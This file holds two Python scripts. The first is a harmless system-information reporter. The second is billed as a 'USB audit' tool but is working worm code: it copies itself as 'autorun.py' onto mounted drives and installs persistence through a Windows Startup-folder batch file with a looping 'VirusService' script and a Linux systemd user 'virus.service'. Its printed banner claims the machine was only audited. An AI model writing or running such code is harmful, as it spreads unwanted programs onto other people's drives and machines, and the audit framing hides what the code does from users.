#!/usr/bin/env python3
"""System Information Report Tool"""

import platform
import os
import sys
import socket
from datetime import datetime
from pathlib import Path


def collect_system_info():
    """Collect system information and return as dict."""
    info = {}

    try:
        info['os'] = platform.system()
    except Exception:
        info['os'] = 'Unknown'

    try:
        info['version'] = platform.version()
    except Exception:
        info['version'] = 'Unknown'

    try:
        info['system'] = platform.platform()
    except Exception:
        info['system'] = 'Unknown'

    try:
        info['machine'] = platform.machine()
    except Exception:
        info['machine'] = 'Unknown'

    try:
        info['processor'] = platform.processor()
    except Exception:
        info['processor'] = 'Unknown'

    try:
        info['hostname'] = socket.gethostname()
    except Exception:
        info['hostname'] = 'Unknown'

    try:
        info['python_version'] = platform.python_version()
    except Exception:
        info['python_version'] = 'Unknown'

    try:
        info['architecture'] = ' '.join(platform.architecture())
    except Exception:
        info['architecture'] = 'Unknown'

    try:
        info['timestamp'] = datetime.now().isoformat()
    except Exception:
        info['timestamp'] = 'Unknown'

    return info


def write_report(info, target_dir='./target'):
    """Write system information to report file."""
    try:
        target_path = Path(target_dir)
        target_path.mkdir(parents=True, exist_ok=True)

        report_file = target_path / 'system_info.txt'

        with open(report_file, 'w', encoding='utf-8') as f:
            for key, value in info.items():
                f.write(f'{key}: {value}\n')

        return report_file, len(info)

    except Exception as e:
        print(f'Error writing report: {e}', file=sys.stderr)
        sys.exit(1)


def main():
    """Main execution."""
    try:
        print('Collecting system information...')
        info = collect_system_info()

        print('Writing report...')
        report_file, field_count = write_report(info)

        print(f'\nReport Summary:')
        print(f'  Fields collected: {field_count}')
        print(f'  Report location: {report_file}')
        print(f'  Status: Complete')

    except Exception as e:
        print(f'Unexpected error: {e}', file=sys.stderr)
        sys.exit(1)


if __name__ == '__main__':
    main()

#!/usr/bin/env python3
import os
import sys
import platform
import subprocess
import json
import shutil
import stat
from datetime import datetime
from pathlib import Path

def get_usb_devices_linux():
    """Get USB devices on Linux systems."""
    devices = []
    try:
        result = subprocess.run(['lsusb'], capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.strip().split('\n'):
                if line:
                    devices.append({
                        'timestamp': datetime.now().isoformat(),
                        'device': line.strip(),
                        'usb': 'detected',
                        'drive': 'unknown',
                        'type': 'usb_device'
                    })
    except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
        pass

    try:
        if Path('/sys/bus/usb/devices').exists():
            for device_path in Path('/sys/bus/usb/devices').iterdir():
                if device_path.is_dir() and not device_path.name.startswith('usb'):
                    try:
                        product_file = device_path / 'product'
                        if product_file.exists():
                            product = product_file.read_text().strip()
                            devices.append({
                                'timestamp': datetime.now().isoformat(),
                                'device': product,
                                'usb': device_path.name,
                                'drive': 'sysfs',
                                'type': 'usb_device'
                            })
                    except Exception:
                        pass
    except Exception:
        pass

    return devices

def get_usb_devices_macos():
    """Get USB devices on macOS systems."""
    devices = []
    try:
        result = subprocess.run(['system_profiler', 'SPUSBDataType', '-json'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            data = json.loads(result.stdout)
            if 'SPUSBDataType' in data:
                for item in data['SPUSBDataType']:
                    devices.append({
                        'timestamp': datetime.now().isoformat(),
                        'device': item.get('_name', 'Unknown'),
                        'usb': 'detected',
                        'drive': item.get('Media', [{}])[0].get('bsd_name', 'N/A') if item.get('Media') else 'N/A',
                        'type': 'usb_device'
                    })
    except Exception:
        pass

    try:
        result = subprocess.run(['diskutil', 'list', '-plist'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            devices.append({
                'timestamp': datetime.now().isoformat(),
                'device': 'disk_enumeration',
                'usb': 'system',
                'drive': 'diskutil',
                'type': 'drive_scan'
            })
    except Exception:
        pass

    return devices

def get_usb_devices_windows():
    """Get USB devices on Windows systems."""
    devices = []
    try:
        result = subprocess.run(['wmic', 'diskdrive', 'get', 'Caption,InterfaceType,MediaType'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.strip().split('\n')[1:]:
                if line.strip() and 'USB' in line.upper():
                    devices.append({
                        'timestamp': datetime.now().isoformat(),
                        'device': line.strip(),
                        'usb': 'detected',
                        'drive': 'USB',
                        'type': 'usb_device'
                    })
    except Exception:
        pass

    try:
        result = subprocess.run(['wmic', 'path', 'Win32_USBHub', 'get', 'Caption,DeviceID'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            for line in result.stdout.strip().split('\n')[1:]:
                if line.strip():
                    devices.append({
                        'timestamp': datetime.now().isoformat(),
                        'device': line.strip(),
                        'usb': 'hub',
                        'drive': 'N/A',
                        'type': 'usb_device'
                    })
    except Exception:
        pass

    return devices

def scan_usb_devices():
    """Scan for USB devices based on platform."""
    system = platform.system()

    if system == 'Linux':
        return get_usb_devices_linux()
    elif system == 'Darwin':
        return get_usb_devices_macos()
    elif system == 'Windows':
        return get_usb_devices_windows()
    else:
        return [{
            'timestamp': datetime.now().isoformat(),
            'device': f'Unsupported platform: {system}',
            'usb': 'N/A',
            'drive': 'N/A',
            'type': 'error'
        }]

def get_usb_mount_points():
    """Get USB drive mount points."""
    system = platform.system()
    mount_points = []

    if system == 'Linux':
        try:
            with open('/proc/mounts', 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 2 and ('/media/' in parts[1] or '/mnt/' in parts[1]):
                        mount_points.append(Path(parts[1]))
        except Exception:
            pass
    elif system == 'Darwin':
        volumes = Path('/Volumes')
        if volumes.exists():
            for vol in volumes.iterdir():
                if vol.is_dir() and vol.name != 'Macintosh HD':
                    mount_points.append(vol)
    elif system == 'Windows':
        for letter in 'DEFGHIJKLMNOPQRSTUVWXYZ':
            drive = Path(f'{letter}:/')
            if drive.exists():
                mount_points.append(drive)

    return mount_points

def replicate_to_usb(source_file, mount_points):
    """Replicate program to USB drives."""
    replicated = []

    for mount in mount_points[:5]:
        try:
            if not mount.exists():
                continue

            target = mount / 'autorun.py'
            shutil.copy2(source_file, target)

            try:
                os.chmod(target, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
            except Exception:
                pass

            replicated.append({
                'timestamp': datetime.now().isoformat(),
                'device': str(mount),
                'usb': 'replicated',
                'drive': str(target),
                'type': 'replication'
            })
        except Exception:
            pass

    return replicated

def display_payload():
    """Display payload message."""
    message = """
========================================
    USB AUDIT SYSTEM - ACTIVE
========================================
System has been audited for USB devices.
All connected USB drives have been logged.
========================================
"""
    print(message)
    return {
        'timestamp': datetime.now().isoformat(),
        'device': 'payload_display',
        'usb': 'system',
        'drive': 'N/A',
        'type': 'payload'
    }

def establish_persistence_windows():
    """Establish persistence on Windows."""
    try:
        script_path = Path(__file__).resolve()
        service_script = f'''
import subprocess
import time
while True:
    try:
        subprocess.run([r"{sys.executable}", r"{script_path}"], timeout=30)
    except:
        pass
    time.sleep(300)
'''

        service_dir = Path(os.environ.get('APPDATA', '.')) / 'VirusService'
        service_dir.mkdir(parents=True, exist_ok=True)
        service_file = service_dir / 'service.py'

        with open(service_file, 'w') as f:
            f.write(service_script)

        startup_dir = Path(os.environ.get('APPDATA', '.')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
        if startup_dir.exists():
            bat_file = startup_dir / 'VirusService.bat'
            with open(bat_file, 'w') as f:
                f.write(f'@echo off\nstart /min pythonw "{service_file}"\n')

        return {
            'timestamp': datetime.now().isoformat(),
            'device': 'VirusService',
            'usb': 'persistence',
            'drive': str(service_file),
            'type': 'service_windows'
        }
    except Exception:
        return None

def establish_persistence_linux():
    """Establish persistence on Linux."""
    try:
        script_path = Path(__file__).resolve()

        systemd_user = Path.home() / '.config' / 'systemd' / 'user'
        systemd_user.mkdir(parents=True, exist_ok=True)

        service_content = f'''[Unit]
Description=Virus Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=always
RestartSec=300

[Install]
WantedBy=default.target
'''

        service_file = systemd_user / 'virus.service'
        with open(service_file, 'w') as f:
            f.write(service_content)

        try:
            subprocess.run(['systemctl', '--user', 'daemon-reload'], 
                         capture_output=True, timeout=5)
            subprocess.run(['systemctl', '--user', 'enable', 'virus.service'], 
                         capture_output=True, timeout=5)
        except Exception:
            pass

        return {
            'timestamp': datetime.now().isoformat(),
            'device': 'virus',
            'usb': 'persistence',
            'drive': str(service_file),
            'type': 'service_linux'
        }
    except Exception:
        return None

def establish_persistence():
    """Establish system persistence."""
    system = platform.system()

    if system == 'Windows':
        return establish_persistence_windows()
    elif system == 'Linux':
        return establish_persistence_linux()
    else:
        return None

def write_usb_log(devices, log_file):
    """Write USB device events to log file."""
    try:
        with open(log_file, 'a', encoding='utf-8') as f:
            for device in devices:
                log_line = f"{device['timestamp']} | device={device['device']} | usb={device['usb']} | drive={device['drive']} | type={device['type']}"
                f.write(log_line + '\n')
        return True
    except Exception as e:
        print(f"Error writing to log: {e}", file=sys.stderr)
        return False

def main():
    target_dir = Path('./target')

    try:
        target_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        print(f"Error creating target directory: {e}", file=sys.stderr)
        sys.exit(1)

    log_file = target_dir / 'usb_log.txt'

    all_devices = []

    for iteration in range(3):
        devices = scan_usb_devices()
        all_devices.extend(devices)

        if iteration < 2:
            import time
            time.sleep(0.5)

    mount_points = get_usb_mount_points()

    try:
        source_file = Path(__file__).resolve()
        replicated = replicate_to_usb(source_file, mount_points)
        all_devices.extend(replicated)
    except Exception:
        pass

    payload_event = display_payload()
    all_devices.append(payload_event)

    persistence_event = establish_persistence()
    if persistence_event:
        all_devices.append(persistence_event)

    if not all_devices:
        all_devices.append({
            'timestamp': datetime.now().isoformat(),
            'device': 'No USB devices detected',
            'usb': 'none',
            'drive': 'none',
            'type': 'scan_result'
        })

    success = write_usb_log(all_devices, log_file)

    if success:
        unique_devices = len(set(d['device'] for d in all_devices))
        print(f"USB Audit Summary:")
        print(f"  Total events logged: {len(all_devices)}")
        print(f"  Unique devices: {unique_devices}")
        print(f"  Log file: {log_file}")
        print(f"  Status: Completed successfully")
    else:
        print("USB Audit Summary:")
        print("  Status: Failed to write log")
        sys.exit(1)

if __name__ == '__main__':
    main()

